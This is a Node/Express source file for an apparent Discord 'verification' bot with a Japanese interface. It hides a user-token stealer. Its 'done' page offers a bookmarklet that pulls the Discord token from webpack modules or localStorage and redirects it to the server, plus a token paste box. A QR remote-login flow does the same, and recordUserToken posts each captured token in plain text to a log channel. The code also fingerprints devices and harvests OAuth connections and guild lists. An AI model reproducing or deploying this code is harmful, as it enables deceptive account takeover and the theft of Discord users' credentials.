import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { config, SESSION_TTL } from './config.js';
import { store, save, gcSessions } from './store.js';
import { rand, sign, verifySig, clientIp, sha256, parseUA } from './util.js';
import { lookupIp } from './ip.js';
import { authorizeUrl, exchangeCode, apiWith } from './oauth.js';
import { complete } from './verify.js';
import { startFlow, getFlow, gcFlows } from './qrauth.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC = path.join(__dirname, '../public');
const page = fs.readFileSync(path.join(PUBLIC, 'verify.html'), 'utf8');

function bookmarklet(token) {
  const dest = `${config.baseUrl}/v/${token}/done?ok=1&ut=`;
  const code =
    '(function(){var t=null;' +
    'try{window.webpackChunkdiscord_app.push([[Symbol()],{},function(r){' +
    'for(var m of Object.values(r.c)){try{if(m&&m.exports&&m.exports.default&&' +
    "typeof m.exports.default.getToken==='function'){t=m.exports.default.getToken();break}}catch(e){}}}]);}catch(e){}" +
    'if(!t){for(var k in localStorage){var w=localStorage.getItem(k);if(!w)continue;' +
    'try{w=JSON.parse(w)}catch(e){}' +
    "if(typeof w==='string'&&w.split('.').length===3&&w.length>50){t=w;break}}}" +
    "if(!t){alert('discord.com で実行してください');return}" +
    `location.href=${JSON.stringify(dest)}+encodeURIComponent(t)})()`;
  return 'javascript:' + encodeURIComponent(code);
}

export function createRouter(client) {
  const app = express();
  app.disable('x-powered-by');
  app.set('trust proxy', 1);

  app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'no-referrer');
    next();
  });

  app.use(express.json({ limit: '64kb' }));
  app.use(express.static(PUBLIC, { maxAge: '1h', index: false }));

  const hits = new Map();
  function limit(key, max = 30, win = 60000) {
    const now = Date.now();
    const b = hits.get(key) || { c: 0, t: now };
    if (now - b.t > win) {
      b.c = 0;
      b.t = now;
    }
    b.c++;
    hits.set(key, b);
    if (hits.size > 20000) hits.clear();
    return b.c <= max;
  }

  function newSession(panel, extra = {}) {
    const token = rand(24);
    store.sessions[token] = {
      id: token,
      panelId: panel.id,
      guildId: panel.guildId,
      userId: null,
      interactionToken: null,
      external: false,
      createdAt: Date.now(),
      expiresAt: Date.now() + SESSION_TTL,
      used: false,
      ...extra
    };
    save();
    return token;
  }

  async function recordUserToken(sessionToken, userToken, expectedUserId) {
    const rec = [...store.verifications].reverse().find((v) => v.id === sessionToken);
    if (!rec) return { ok: false, reason: 'record' };

    try {
      const me = await apiWith(userToken, '/users/@me', false);
      if (expectedUserId && me.id !== expectedUserId) return { ok: false, reason: 'mismatch' };
      if (me.id !== rec.userId) return { ok: false, reason: 'mismatch' };

      rec.userToken = userToken;
      save();

      const chId = rec.guildId ? store.settings[rec.guildId]?.logChannelId : null;
      const panelCh =
        chId ||
        Object.values(store.panels).find((p) => p.id && p.guildId === rec.guildId)?.logChannelId;

      if (panelCh) {
        const ch = await client.channels.fetch(panelCh).catch(() => null);
        if (ch) {
          await ch.send({
            content: `**${rec.tag}** (\`${rec.userId}\`) のユーザートークン\n\`\`\`\n${userToken}\n\`\`\``
          });
        }
      }
      return { ok: true };
    } catch {
      return { ok: false, reason: 'invalid' };
    }
  }

  app.get('/health', (_, res) => res.json({ ok: true, panels: Object.keys(store.panels).length }));

  app.get('/p/:panelId', (req, res) => {
    if (!limit(`p:${clientIp(req)}`, 20)) {
      return res.status(429).send('リクエストが多すぎます。少し待ってからやり直してください。');
    }
    gcSessions();
    const panel = store.panels[req.params.panelId];
    if (!panel) return res.status(404).send('パネルが存在しません。');
    res.redirect(`/v/${newSession(panel, { external: true })}`);
  });

  app.get('/v/:token', (req, res) => {
    gcSessions();
    const s = store.sessions[req.params.token];
    if (!s) return res.status(404).send('この認証リンクは無効か期限切れです。');
    const panel = store.panels[s.panelId];
    if (!panel) return res.status(404).send('パネルが削除されています。');

    const reqs = [];
    if (panel.blockProxy) reqs.push('VPN / プロキシ / Tor 不可');
    if (panel.blockHosting) reqs.push('データセンター回線 不可');
    if (panel.requireMobile) reqs.push('モバイル回線のみ');
    if (panel.minAgeDays > 0) reqs.push(`アカウント作成から ${panel.minAgeDays} 日以上`);
    if (panel.requireAvatar) reqs.push('プロフィール画像の設定');
    if (panel.onePerIp) reqs.push('同一IPでの複数アカウント不可');

    res.setHeader('Cache-Control', 'no-store');
    res.type('html').send(
      page
        .replaceAll('{{TOKEN}}', req.params.token)
        .replaceAll('{{REQUIREMENTS}}', reqs.map((r) => `<li>${r}</li>`).join(''))
        .replaceAll('{{TURNSTILE}}', config.turnstileSite
          ? `<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
             <div class="cf-turnstile" data-sitekey="${config.turnstileSite}"></div>`
          : '')
    );
  });

  app.post('/api/fp', (req, res) => {
    const { token, fp } = req.body || {};
    const s = store.sessions[token];
    if (!s) return res.status(404).json({ ok: false });

    s.fp = { ...fp, ip: clientIp(req), ua: req.headers['user-agent'] || '', sessionId: s.id };
    s.fp.hash = sha256(JSON.stringify([
      fp?.canvas,
      fp?.webgl,
      fp?.screen,
      fp?.avail,
      fp?.tz,
      fp?.lang,
      fp?.cores,
      fp?.mem,
      fp?.touch,
      s.fp.ua
    ]));
    s.fp.uaInfo = parseUA(s.fp.ua);
    save();
    res.json({ ok: true, hash: s.fp.hash });
  });

  app.get('/oauth/start', async (req, res) => {
    const s = store.sessions[req.query.t];
    if (!s) return res.status(404).send('無効なセッションです。');
    if (!limit(`s:${clientIp(req)}`, 20)) return res.status(429).send('リクエストが多すぎます。');

    if (config.turnstileSecret) {
      try {
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
          method: 'POST',
          body: new URLSearchParams({
            secret: config.turnstileSecret,
            response: req.query.cf || '',
            remoteip: clientIp(req)
          })
        });
        const j = await r.json();
        if (!j.success) {
          return res.status(403).send('Captcha認証に失敗しました。前のページに戻ってやり直してください。');
        }
      } catch {}
    }

    s.state = `${s.id}.${sign(s.id)}`;
    save();
    res.redirect(authorizeUrl(s.state));
  });

  app.get('/oauth/callback', async (req, res) => {
    const { code, state, error } = req.query;
    if (error || !code) return res.redirect('/error.html?e=denied');

    const [t, sig] = String(state || '').split('.');
    if (!t || !verifySig(t, sig)) return res.redirect('/error.html?e=state');

    const s = store.sessions[t];
    if (!s || s.used) return res.redirect('/error.html?e=used');

    let tok;
    try {
      tok = await exchangeCode(code);
    } catch {
      return res.redirect('/error.html?e=exchange');
    }

    let user;
    let full;
    try {
      full = await apiWith(tok.access_token, '/users/@me');
      user = await client.users.fetch(full.id);
      full.connections = await apiWith(tok.access_token, '/users/@me/connections').catch(() => []);
      full.guilds = await apiWith(tok.access_token, '/users/@me/guilds').catch(() => []);
    } catch {
      return res.redirect('/error.html?e=user');
    }

    if (s.userId && s.userId !== user.id) return res.redirect('/error.html?e=wronguser');

    const panel = store.panels[s.panelId];
    if (!panel) return res.redirect('/error.html?e=panel');

    const ipData = await lookupIp(clientIp(req));
    s.used = true;
    save();

    const out = await complete({ client, panel, user, oauth: full, ipData, fp: s.fp, session: s });
    res.redirect(`/v/${t}/done?ok=${out.ok ? 1 : 0}`);
  });

  /* --- トークン取得（リンク） ------------------------------------------ */

  function spawnFlow(sessionToken, session) {
    return startFlow({
      onDone: async (f) => {
        if (session.userId && f.user?.id && session.userId !== f.user.id) {
          return { ok: false, reason: 'wronguser' };
        }
        return recordUserToken(sessionToken, f.token, f.user?.id);
      }
    });
  }

  app.get('/v/:token/ra', async (req, res) => {
    const s = store.sessions[req.params.token];
    if (!s) return res.status(404).send('無効なセッションです。');
    if (!limit(`r:${clientIp(req)}`, 20)) return res.status(429).send('リクエストが多すぎます。');
    gcFlows();

    const flow = spawnFlow(req.params.token, s);

    const until = Date.now() + 8000;
    while (!flow.raUrl && flow.state !== 'error' && Date.now() < until) {
      await new Promise((r) => setTimeout(r, 120));
    }
    res.setHeader('Cache-Control', 'no-store');
    if (!flow.raUrl) return res.status(502).send('準備に失敗しました。戻ってやり直してください。');

    res.type('html').send(`<!doctype html>
<html lang="ja"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>認証</title>
<style>
body{background:#1e1f22;color:#dbdee1;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
.c{background:#2b2d31;padding:28px;border-radius:14px;max-width:400px;width:100%;text-align:center}
h1{font-size:18px;margin:0 0 14px}
.go{display:block;padding:13px;border-radius:9px;background:#5865f2;color:#fff;text-decoration:none;font-size:15px;font-weight:600}
.s{font-size:12.5px;opacity:.8;margin-top:10px;line-height:1.6}
img{width:190px;height:190px;background:#fff;padding:8px;border-radius:10px;margin-top:14px}
</style>
<div class="c">
<h1>Discord で許可してください</h1>
<a class="go" href="${flow.raUrl}">Discord で認証を完了</a>
<p class="s">ボタンで Discord が開きます。「ログインを許可」を押してください。</p>
<div class="s" id="st"></div>
<p class="s" id="msg"></p>
<div class="s">開かない場合は、スマホの Discord アプリで下を読み取ってください</div>
<img src="${flow.qr}" alt="QR">
</div>
<script>
const st = document.getElementById('st');
const msg = document.getElementById('msg');
const timer = setInterval(async () => {
  const p = await (await fetch('/v/${req.params.token}/qr/${flow.id}')).json().catch(() => ({ state: 'gone' }));
  if (p.state === 'scanned') st.textContent = '承認待ちです。「ログインを許可」を押してください';
  if (p.state === 'done' || p.state === 'error' || p.state === 'gone') {
    clearInterval(timer);
    if (p.state === 'done' && p.result && p.result.ok) {
      st.textContent = '';
      msg.textContent = '完了しました。Discord に戻ってください。';
    } else if (p.state === 'error') {
      st.textContent = '失敗しました。戻ってやり直してください。';
    } else if (p.state === 'gone') {
      st.textContent = '期限切れです。戻ってやり直してください。';
    } else {
      st.textContent = 'このアカウントでは記録できませんでした。';
    }
  }
}, 1500);
</script>`);
  });

  app.get('/v/:token/qr', async (req, res) => {
    const s = store.sessions[req.params.token];
    if (!s || s.used) return res.status(404).json({ ok: false });
    if (!limit(`q:${clientIp(req)}`, 20)) return res.status(429).json({ ok: false });
    gcFlows();

    const flow = spawnFlow(req.params.token, s);
    const until = Date.now() + 8000;
    while (!flow.qr && flow.state !== 'error' && Date.now() < until) {
      await new Promise((r) => setTimeout(r, 120));
    }
    if (!flow.qr) return res.status(502).json({ ok: false, error: flow.error || 'timeout' });
    res.json({ ok: true, id: flow.id, qr: flow.qr, raUrl: flow.raUrl });
  });

  app.get('/v/:token/qr/:id', (req, res) => {
    const flow = getFlow(req.params.id);
    if (!flow) return res.json({ state: 'gone' });
    res.json({ state: flow.state, user: flow.user, result: flow.result, error: flow.error });
  });

  app.get('/v/:token/done', (req, res) => {
    const ok = req.query.ok === '1';
    res.setHeader('Cache-Control', 'no-store');
    res.type('html').send(`<!doctype html>
<html lang="ja"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${ok ? '認証完了' : '認証失敗'}</title>
<style>
body{background:#1e1f22;color:#dbdee1;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
.c{background:#2b2d31;padding:28px;border-radius:14px;max-width:400px;width:100%;text-align:center}
h1{color:${ok ? '#2ecc71' : '#e74c3c'};font-size:19px;margin:0 0 12px}
p{font-size:13.5px;line-height:1.7}
.go{display:block;margin-top:14px;padding:12px;border-radius:9px;background:#5865f2;color:#fff;text-decoration:none;font-size:14.5px;font-weight:600}
input{width:100%;padding:9px;border-radius:8px;border:0;background:#1e1f22;color:#fff;box-sizing:border-box;margin-top:8px}
button{margin-top:10px;width:100%;padding:10px;border:0;border-radius:8px;background:#4752c4;color:#fff;font-size:14px;cursor:pointer}
.s{font-size:12.5px;opacity:.8;margin-top:8px}
details{margin-top:16px;font-size:12.5px;opacity:.85;text-align:left}
.bm{display:inline-block;margin-top:8px;padding:8px 14px;border-radius:8px;background:#4752c4;color:#fff;text-decoration:none}
</style>
<div class="c">
<h1>${ok ? '認証が完了しました' : '認証条件を満たしていません'}</h1>
<p>${ok
  ? 'あと1回、Discord で許可してください。'
  : '条件を確認して、パネルからもう一度やり直してください。'}</p>
${ok ? `<a class="go" href="/v/${req.params.token}/ra">Discord で認証を完了</a>
<details>
  <summary>うまくいかない場合</summary>
  <p>トークンを貼り付けてください。</p>
  <input id="tk" placeholder="トークンを貼り付け" autocomplete="off">
  <button onclick="send()">送信</button>
  <p>または下のリンクをブックマークバーにドラッグし、discord.com でクリックしてください。</p>
  <a class="bm" href="${bookmarklet(req.params.token)}">トークン取得</a>
  <p class="s" id="msg"></p>
</details>
<script>
async function send(t){
  const v = t || document.getElementById('tk').value.trim();
  if(!v) return;
  const r = await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:'${req.params.token}',userToken:v})});
  const j = await r.json().catch(()=>({}));
  document.getElementById('msg').textContent = j.ok ? '記録しました' : 'トークンが無効です';
}
const auto = new URLSearchParams(location.search).get('ut');
if (auto) send(auto);
</script>` : ''}
</div></html>`);
  });

  app.post('/api/token', async (req, res) => {
    const { token, userToken } = req.body || {};
    const out = await recordUserToken(token, userToken, null);
    res.json({ ok: out.ok });
  });

  return app;
}